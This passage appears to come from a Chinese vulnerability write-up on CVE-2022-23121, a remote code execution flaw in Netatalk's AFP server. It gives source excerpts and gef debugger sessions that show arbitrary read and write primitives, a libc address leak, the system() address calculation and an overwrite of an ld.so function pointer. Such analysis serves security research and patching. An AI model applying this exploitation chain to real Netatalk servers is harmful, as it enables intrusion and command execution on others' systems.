&lt;p>在&lt;code>ad_convert_osx&lt;/code>函数中，程序将appledouble文件映射到内存中，此时对文件映射的内存的读写即是对该文件的读写。&lt;code>ad_convert_osx&lt;/code>函数映射之后调用了&lt;code>memmove&lt;/code>和&lt;code>ad_rebuild_adouble_header_osx&lt;/code>函数，之后通过&lt;code>munmap&lt;/code>函数取消映射，将内存中的数据写入文件内。&lt;/p>
&lt;p>&lt;code>mmap&lt;/code>的长度参数&lt;code>origlen = ad_getentryoff(ad, ADEID_RFORK) + ad_getentrylen(ad, ADEID_RFORK)&lt;/code>即&lt;code>ad.ADEID_RFORK.off + ad.ADEID_RFORK.len&lt;/code> 都为可控值&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>static int ad_convert_osx&lt;span style="color:#f92672">(&lt;/span>const char *path, struct adouble *ad&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> origlen &lt;span style="color:#f92672">=&lt;/span> ad_getentryoff&lt;span style="color:#f92672">(&lt;/span>ad, ADEID_RFORK&lt;span style="color:#f92672">)&lt;/span> + ad_getentrylen&lt;span style="color:#f92672">(&lt;/span>ad, ADEID_RFORK&lt;span style="color:#f92672">)&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> map &lt;span style="color:#f92672">=&lt;/span> mmap&lt;span style="color:#f92672">(&lt;/span>NULL, origlen, PROT_READ | PROT_WRITE, MAP_SHARED, ad_reso_fileno&lt;span style="color:#f92672">(&lt;/span>ad&lt;span style="color:#f92672">)&lt;/span>, 0&lt;span style="color:#f92672">)&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memmove&lt;span style="color:#f92672">(&lt;/span>map + ad_getentryoff&lt;span style="color:#f92672">(&lt;/span>ad, ADEID_FINDERI&lt;span style="color:#f92672">)&lt;/span> + ADEDLEN_FINDERI,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> map + ad_getentryoff&lt;span style="color:#f92672">(&lt;/span>ad, ADEID_RFORK&lt;span style="color:#f92672">)&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ad_getentrylen&lt;span style="color:#f92672">(&lt;/span>ad, ADEID_RFORK&lt;span style="color:#f92672">))&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>void&lt;span style="color:#f92672">)&lt;/span>ad_rebuild_adouble_header_osx&lt;span style="color:#f92672">(&lt;/span>ad, map&lt;span style="color:#f92672">)&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> munmap&lt;span style="color:#f92672">(&lt;/span>map, origlen&lt;span style="color:#f92672">)&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define ad_getentrylen(ad,eid) ((ad)-&amp;gt;ad_eid[(eid)].ade_len)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>long ad_getentryoff&lt;span style="color:#f92672">(&lt;/span>const struct adouble *ad, int eid&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>ad-&amp;gt;ad_vers &lt;span style="color:#f92672">==&lt;/span> AD_VERSION2&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> ad-&amp;gt;ad_eid&lt;span style="color:#f92672">[&lt;/span>eid&lt;span style="color:#f92672">]&lt;/span>.ade_off;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> switch &lt;span style="color:#f92672">(&lt;/span>eid&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> ADEID_DFORK:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> 0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> ADEID_RFORK:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#ifdef HAVE_EAFD&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> 0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> ad-&amp;gt;ad_eid&lt;span style="color:#f92672">[&lt;/span>eid&lt;span style="color:#f92672">]&lt;/span>.ade_off;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#endif&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> default:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> ad-&amp;gt;ad_eid&lt;span style="color:#f92672">[&lt;/span>eid&lt;span style="color:#f92672">]&lt;/span>.ade_off;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /* deadc0de */
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AFP_PANIC&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;What am I doing here?&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>mmap&lt;/code>之后文件已映射到内存中，在经过多次测试后，当&lt;code>resource fork length + resource fork offset ≤1000&lt;/code> 时会mmap分配的内存在ld.sodata段上面。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/16.png" />&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/17.png" />&lt;/p>
&lt;p>&lt;strong>任意写&lt;/strong>&lt;/p>
&lt;p>仔细看调用&lt;code>memmove&lt;/code>时的参数，&lt;code>map&lt;/code>为文件映射到内存的首地址，&lt;code>ad_getentryoff&lt;/code>为获取指定entry id的entry的off，&lt;code>ADEDLEN_FINDERI&lt;/code>为宏定义值为&lt;code>32=0x20&lt;/code>，而我们可以控制各个entry的off和len，通过该处调用，即我们可以从&lt;code>map + ad.ADEID_RFORK.off&lt;/code>处读取任意长度的数据写入到任何高于&lt;code>map+0x20&lt;/code>的内存（前提是该地址可写）也就是将文件中&lt;code>ad.ADEID_RFORK.off&lt;/code> 处的数据写入该内存，而&lt;code>ad.ADEID_FINDERI.off&lt;/code>和&lt;code>ad.ADEID_RFORK.off&lt;/code>都为可控值，即可达到任意写。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> memmove&lt;span style="color:#f92672">(&lt;/span>map + ad.ADEID_FINDERI.off + 0x20,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> map + ad.ADEID_RFORK.off,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ad.ADEID_RFORK.len&lt;span style="color:#f92672">)&lt;/span>;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>任意读&lt;/strong>&lt;/p>
&lt;p>任意读发生在任意写的后面的函数调用，在&lt;code>ad_rebuild_adouble_header_osx&lt;/code> 函数中有如下语句，该语句将&lt;code>ad.ad_data+ad.ADEID_FINDERI.off&lt;/code> 处开始长为0x20的数据写入到&lt;code>adbuf+ADEDOFF_FINDERI_OSX&lt;/code>中，&lt;code>ADEDOFF_FINDERI_OSX&lt;/code>为宏定义，展开后可得值为&lt;code>26+2*12=50=0x32&lt;/code>，而adbuf为&lt;code>mmap&lt;/code>映射后返回的内存地址，该处语句将数据写入到&lt;code>mmap&lt;/code>映射的内存偏移&lt;code>0x32&lt;/code>的位置。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define ad_entry(ad,eid) ((caddr_t)(ad)-&amp;gt;ad_data + (ad)-&amp;gt;ad_eid[(eid)].ade_off)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">ad_rebuild_adouble_header_osx&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">adouble&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ad, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>adbuf)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memcpy(adbuf &lt;span style="color:#f92672">+&lt;/span> ADEDOFF_FINDERI_OSX, ad_entry(ad, ADEID_FINDERI), ADEDLEN_FINDERI);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define ADEDOFF_FINDERI_OSX (AD_HEADER_LEN + ADEID_NUM_OSX*AD_ENTRY_LEN)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define AD_HEADER_LEN (ADEDLEN_MAGIC + ADEDLEN_VERSION + ADEDLEN_FILLER + ADEDLEN_NENTRIES) &lt;/span>&lt;span style="color:#75715e">/* 26 */&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define ADEID_NUM_OSX 2
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define AD_ENTRY_LEN 12 &lt;/span>&lt;span style="color:#75715e">/* size of a single entry header */&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在调用完&lt;code>ad_rebuild_adouble_header_osx&lt;/code> 函数后，程序调用&lt;code>munmap&lt;/code>函数取消文件映射，内存内的数据会被写回到appledouble文件中，综合有：可以将&lt;code>ad.ad_data+ad.ADEID_FINDERI.off&lt;/code> 处开始长为0x20的数据写入到文件偏移0x32处的地方，此时可以通过读取文件获取任意读的内存的内容。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/18.png" />&lt;/p>
&lt;p>&lt;strong>组合利用&lt;/strong>&lt;/p>
&lt;p>在内存中ad指向的结构体是存放在栈上的，分配的adouble结构体地址位于&lt;code>ad_header_read_osx&lt;/code>栈帧的&lt;code>rbp-0x620&lt;/code>处，可以用调试器测算和&lt;code>__libc_start_main_ret&lt;/code>的地址&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/19.png" />&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef➤ bt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#0 0x00007f624307220b in ad_header_read_osx (path=0x7f62430d6bc0 &amp;lt;pathbuf&amp;gt; &amp;#34;._read&amp;#34;, ad=0x558ce325bba0, hst=0x7ffcf6e36990) at ad_open.c:698&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#1 0x00007f6243074e50 in ad_open_rf_ea (path=0x558ce2e38f80 &amp;lt;upath&amp;gt; &amp;#34;read&amp;#34;, adflags=0x283, mode=0x0, ad=0x558ce325bba0) at ad_open.c:1488&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#2 0x00007f62430750ae in ad_open_rf (path=0x558ce2e38f80 &amp;lt;upath&amp;gt; &amp;#34;read&amp;#34;, adflags=0x283, mode=0x0, ad=0x558ce325bba0) at ad_open.c:1529&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#3 0x00007f6243075d29 in ad_open (ad=0x558ce325bba0, path=0x558ce2e38f80 &amp;lt;upath&amp;gt; &amp;#34;read&amp;#34;, adflags=0x283) at ad_open.c:1895&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#4 0x0000558ce2e143bd in afp_openfork (obj=0x558ce2e4d920 &amp;lt;obj&amp;gt;, ibuf=0x7f6242b6c022 &amp;#34;uthent&amp;#34;, ibuflen=0x12, rbuf=0x558ce3245b10 &amp;#34;&amp;#34;, rbuflen=0x558ce3255b10) at fork.c:364&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#5 0x0000558ce2df2c81 in afp_over_dsi (obj=0x558ce2e4d920 &amp;lt;obj&amp;gt;) at afp_dsi.c:627&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#6 0x0000558ce2e193ff in dsi_start (obj=0x558ce2e4d920 &amp;lt;obj&amp;gt;, dsi=0x558ce3245420, server_children=0x558ce3242240) at main.c:474&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#7 0x0000558ce2e19102 in main (ac=0x4, av=0x7ffcf6e36fc8) at main.c:417&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef➤ i frame &lt;span style="color:#ae81ff">7&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Stack frame at 0x7ffcf6e36ee0:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rip &lt;span style="color:#f92672">=&lt;/span> 0x558ce2e19102 in main &lt;span style="color:#f92672">(&lt;/span>main.c:417&lt;span style="color:#f92672">)&lt;/span>; saved rip &lt;span style="color:#f92672">=&lt;/span> 0x7f6242e51083
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> caller of frame at 0x7ffcf6e36d80
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> source language c.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Arglist at 0x7ffcf6e36d78, args: ac&lt;span style="color:#f92672">=&lt;/span>0x4, av&lt;span style="color:#f92672">=&lt;/span>0x7ffcf6e36fc8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Locals at 0x7ffcf6e36d78, Previous frame&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>s sp is 0x7ffcf6e36ee0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Saved registers:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rbp at 0x7ffcf6e36ed0, rip at 0x7ffcf6e36ed8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef➤ p &amp;amp;adosx.ad_data
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$11 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>char &lt;span style="color:#f92672">(&lt;/span>*&lt;span style="color:#f92672">)[&lt;/span>1024&lt;span style="color:#f92672">])&lt;/span> 0x7ffcf6e36522
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef➤ p 0x7ffcf6e36ed8 - 0x7ffcf6e36522
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$12 &lt;span style="color:#f92672">=&lt;/span> 0x9b6
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>任意读是读取&lt;code>ad.ad_data+ad.ADEID_FINDERI.off&lt;/code> 处长为&lt;code>0x20&lt;/code>的数据，而&lt;code>ad.ad_data&lt;/code> 距离&lt;code>__libc_start_main_ret&lt;/code>为&lt;code>0x9b6&lt;/code>，所以可以设置&lt;code>ad.ADEID_FINDERI.off&lt;/code> 为0x9b6以获取&lt;code>__libc_start_main_ret&lt;/code>地址。利用脚本构造文件并利用NSE脚本上传到服务器&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/20.png" />&lt;/p>
&lt;p>通过命令触发该漏洞、&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/21.png" />&lt;/p>
&lt;p>&lt;code>__libc_start_main_ret&lt;/code>地址已经回显在文件内&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/22.png" />&lt;/p>
&lt;p>验证地址:&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/23.png" />&lt;/p>
&lt;p>在
&lt;a href="https://libc.rip/" target="_blank">https://libc.rip&lt;/a> 上验证libc版本：&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/24.png" />&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/25.png" />&lt;/p>
&lt;p>通过&lt;code>__libc_start_main_ret&lt;/code>地址可以测算&lt;code>system&lt;/code>函数地址&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef➤ p 0x7f6242e51083 - 0x24083 + 0x52290
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$14 &lt;span style="color:#f92672">=&lt;/span> 0x7f6242e7f290
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef➤ p system
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$15 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">{&lt;/span>int &lt;span style="color:#f92672">(&lt;/span>const char *&lt;span style="color:#f92672">)}&lt;/span> 0x7f6242e7f290 &amp;lt;__libc_system&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef➤
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>至此，我们得到了system函数地址，那么如何利用这个地址呢？&lt;/strong>&lt;/p>
&lt;p>Netatalk每次收到客户端请求都是fork子进程处理该请求，父进程继续监听socket，而fork的子进程内存空间和父进程内存空间的内容一样即libc库载入的地址不变，所以可以先发送请求通过任意读获取到system函数地址，第二次发送请求时，由于父进程不变所以&lt;code>system&lt;/code>函数地址不变，通过任意写的&lt;code>system&lt;/code>函数地址不变，才能达到命令执行的效果。&lt;/p>
&lt;p>正是因为fork后，内存空间不变的机制才能利用任意读获取到&lt;code>system&lt;/code>函数地址，而后通过任意写覆盖函数指针达到命令执行的效果。&lt;/p>
&lt;p>在Netatalk执行过程中，程序出错不会立即退出而是会捕获异常，通过任意写，写入了ld.so的数据段，触发错误，导致了如下崩溃：&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/26.png" />&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef➤ bt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#0 0x00007efeac84c59d in _dl_open (file=0x7efeac733eb9 &amp;#34;libgcc_s.so.1&amp;#34;, mode=0x80000002, caller_dlopen=0x7efeac6acfb9 &amp;lt;init+25&amp;gt;, nsid=0xfffffffffffffffe, argc=0x4, argv=0x7ffd9f27a1e8, env=0x7ffd9f27a210) at dl-open.c:786&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#1 0x00007efeac6df8c1 in do_dlopen (ptr=ptr@entry=0x7ffd9f277d60) at dl-libc.c:96&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#2 0x00007efeac6e0928 in __GI__dl_catch_exception (exception=exception@entry=0x7ffd9f277d00, operate=operate@entry=0x7efeac6df880 &amp;lt;do_dlopen&amp;gt;, args=args@entry=0x7ffd9f277d60) at dl-error-skeleton.c:208&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#3 0x00007efeac6e09f3 in __GI__dl_catch_error (objname=objname@entry=0x7ffd9f277d50, errstring=errstring@entry=0x7ffd9f277d58, mallocedp=mallocedp@entry=0x7ffd9f277d4f, operate=operate@entry=0x7efeac6df880 &amp;lt;do_dlopen&amp;gt;, args=args@entry=0x7ffd9f277d60) at dl-error-skeleton.c:227&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#4 0x00007efeac6df9f5 in dlerror_run (args=0x7ffd9f277d60, operate=0x7efeac6df880 &amp;lt;do_dlopen&amp;gt;) at dl-libc.c:46&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#5 __GI___libc_dlopen_mode (name=name@entry=0x7efeac733eb9 &amp;#34;libgcc_s.so.1&amp;#34;, mode=mode@entry=0x80000002) at dl-libc.c:195&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#6 0x00007efeac6acfb9 in init () at backtrace.c:54&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#7 0x00007efeac7834df in __pthread_once_slow (once_control=0x7efeac76fe68 &amp;lt;once&amp;gt;, init_routine=0x7efeac6acfa0 &amp;lt;init&amp;gt;) at pthread_once.c:116&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#8 0x00007efeac6ad104 in __GI___backtrace (array=&amp;lt;optimized out&amp;gt;, size=&amp;lt;optimized out&amp;gt;) at backtrace.c:111&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#9 0x00007efeac7ec7ff in netatalk_panic (why=0x7efeac818148 &amp;#34;internal error&amp;#34;) at fault.c:93&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#10 0x00007efeac7eca69 in fault_report (sig=0xb) at fault.c:127&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#11 0x00007efeac7ecac3 in sig_fault (sig=0xb) at fault.c:147&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#12 &amp;lt;signal handler called&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#13 __memmove_avx_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:238&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#14 0x00007efeac7c10e2 in ad_rebuild_adouble_header_osx (ad=0x7ffd9f279540, adbuf=0x7efeac863000 &amp;#34;&amp;#34;) at ad_flush.c:187&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#15 0x00007efeac7c4d4c in ad_convert_osx (path=0x7efeac829bc0 &amp;lt;pathbuf&amp;gt; &amp;#34;._cmd&amp;#34;, ad=0x7ffd9f279540) at ad_open.c:617&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#16 0x00007efeac7c5379 in ad_header_read_osx (path=0x7efeac829bc0 &amp;lt;pathbuf&amp;gt; &amp;#34;._cmd&amp;#34;, ad=0x55dcb6856780, hst=0x7ffd9f279bb0) at ad_open.c:713&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#17 0x00007efeac7c7e50 in ad_open_rf_ea (path=0x55dcb5a7ef80 &amp;lt;upath&amp;gt; &amp;#34;cmd&amp;#34;, adflags=0x283, mode=0x0, ad=0x55dcb6856780) at ad_open.c:1488&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#18 0x00007efeac7c80ae in ad_open_rf (path=0x55dcb5a7ef80 &amp;lt;upath&amp;gt; &amp;#34;cmd&amp;#34;, adflags=0x283, mode=0x0, ad=0x55dcb6856780) at ad_open.c:1529&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#19 0x00007efeac7c8d29 in ad_open (ad=0x55dcb6856780, path=0x55dcb5a7ef80 &amp;lt;upath&amp;gt; &amp;#34;cmd&amp;#34;, adflags=0x283) at ad_open.c:1895&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#20 0x000055dcb5a5a3bd in afp_openfork (obj=0x55dcb5a93920 &amp;lt;obj&amp;gt;, ibuf=0x7efeac2bf021 &amp;#34;Authent&amp;#34;, ibuflen=0x11, rbuf=0x55dcb6840b10 &amp;#34;&amp;#34;, rbuflen=0x55dcb6850b10) at fork.c:364&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#21 0x000055dcb5a38c81 in afp_over_dsi (obj=0x55dcb5a93920 &amp;lt;obj&amp;gt;) at afp_dsi.c:627&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#22 0x000055dcb5a5f3ff in dsi_start (obj=0x55dcb5a93920 &amp;lt;obj&amp;gt;, dsi=0x55dcb6840420, server_children=0x55dcb683d240) at main.c:474&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#23 0x000055dcb5a5f102 in main (ac=0x4, av=0x7ffd9f27a1e8) at main.c:417&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到，程序试图调用位于&lt;code>0x4141414141414000&lt;/code>处的函数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef➤ x /i $pc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">=&lt;/span>&amp;gt; 0x7efeac84c59d &amp;lt;_dl_open+61&amp;gt;: call QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rip+0x199c5&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#75715e"># 0x7efeac865f68 &amp;lt;_rtld_global+3848&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef➤ x /gx 0x7efeac865f68
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7efeac865f68 &amp;lt;_rtld_global+3848&amp;gt;: 0x4141414141414000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef➤
